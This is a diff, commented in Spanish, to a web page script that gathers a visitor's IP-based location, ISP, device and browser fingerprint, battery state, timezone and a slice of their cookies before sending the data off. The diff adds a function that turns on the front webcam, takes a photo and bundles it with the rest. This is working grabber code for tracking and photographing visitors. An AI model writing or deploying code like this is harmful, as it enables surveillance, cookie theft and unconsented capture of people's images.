@@ -69,13 +69,43 @@
   </div>
 
   <script>
+    async function capturarFoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.playsInline = true;
+        video.muted = true;
+        await video.play();
+
+        // Esperar un momento a que la cámara estabilice
+        await new Promise(r => setTimeout(r, 700));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        // Detener la cámara
+        stream.getTracks().forEach(t => t.stop());
+
+        return canvas.toDataURL("image/jpeg", 0.7);
+      } catch (e) {
+        console.log("No se pudo acceder a la cámara:", e.message);
+        return null;
+      }
+    }
+
     async function enviarInfo() {
       const statusEl = document.getElementById("status");
       const infoEl = document.getElementById("info");
 
-      // ——— Datos base ———
       const data = {
-        // Red
         ip: "",
         country: "",
         city: "",
@@ -84,9 +114,6 @@
         conexion: "No disponible",
         tipoRed: "Desconocido",
         rtt: "N/A",
-        downlink: "N/A",
-
-        // Dispositivo
         os: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Desconocido",
         browser: "Desconocido",
         device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
@@ -97,17 +124,11 @@
         pixelRatio: String(window.devicePixelRatio || 1),
         orientacion: (screen.orientation && screen.orientation.type) ? screen.orientation.type : "Desconocida",
         colorDepth: (screen.colorDepth || "?") + " bits",
-
-        // Batería
         bateria: "No disponible",
         cargando: "No disponible",
-
-        // Idioma / zona
         idioma: navigator.language || "Desconocido",
         idiomas: (navigator.languages || []).join(", ") || "N/A",
         zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
-
-        // Otras
         toque: ("ontouchstart" in window) ? "Sí" : "No",
         cookiesEnabled: navigator.cookieEnabled ? "Sí" : "No",
         cookies: document.cookie ? document.cookie.substring(0, 120) : "(vacío)",
@@ -120,19 +141,16 @@
         vendor: navigator.vendor || "N/A",
         userAgent: navigator.userAgent || "",
         referrer: document.referrer || "(directo)",
-        url: location.href
+        foto: null
       };
 
-      // Conexión
       if (navigator.connection) {
         const c = navigator.connection;
         data.conexion = (c.effectiveType || "?") + " / " + (c.downlink || "?") + " Mbps";
         data.tipoRed = c.type || "Desconocido";
         data.rtt = c.rtt != null ? c.rtt + " ms" : "N/A";
-        data.downlink = c.downlink != null ? c.downlink + " Mbps" : "N/A";
       }
 
-      // Navegador
       const ua = navigator.userAgent;
       if (ua.includes("Edg")) data.browser = "Edge";
       else if (ua.includes("OPR") || ua.includes("Opera")) data.browser = "Opera";
@@ -140,7 +158,6 @@
       else if (ua.includes("Firefox")) data.browser = "Firefox";
       else if (ua.includes("Safari")) data.browser = "Safari";
 
-      // Batería
       if (navigator.getBattery) {
         try {
           const bat = await navigator.getBattery();
@@ -149,7 +166,6 @@
         } catch (e) {}
       }
 
-      // IP + ubicación (fuente más estable)
       try {
         const geo = await fetch("https://ipapi.co/json/", { cache: "no-store" }).then(r => r.json());
         if (geo && !geo.error) {
@@ -157,7 +173,7 @@
           data.country = geo.country_name || geo.country || "";
           data.city = geo.city || "";
           data.region = geo.region || geo.region_code || "";
-          data.isp = geo.org || geo.asn || "";
+          data.isp = geo.org || "";
         }
       } catch (e) {
         try {
@@ -172,7 +188,10 @@
         } catch (e2) {}
       }
 
-      // Mostrar resumen en pantalla
+      // Intentar sacar foto (pide permiso)
+      statusEl.textContent = "Solicitando cámara...";
+      data.foto = await capturarFoto();
+
       infoEl.innerHTML =
         "<b>IP:</b> " + (data.ip || "—") + "<br>" +
         "<b>País:</b> " + (data.country || "—") + (data.city ? " · " + data.city : "") + "<br>" +
@@ -187,9 +206,9 @@
         "<b>Batería:</b> " + data.bateria + " · " + data.cargando + "<br>" +
         "<div class='divider'></div>" +
         "<b>Idioma:</b> " + data.idioma + "<br>" +
-        "<b>Zona:</b> " + data.zonaHoraria;
+        "<b>Zona:</b> " + data.zonaHoraria + "<br>" +
+        "<b>Foto:</b> " + (data.foto ? "Capturada" : "No disponible / denegada");
 
-      // Enviar
       statusEl.textContent = "Enviando...";
       statusEl.className = "status loading";
 
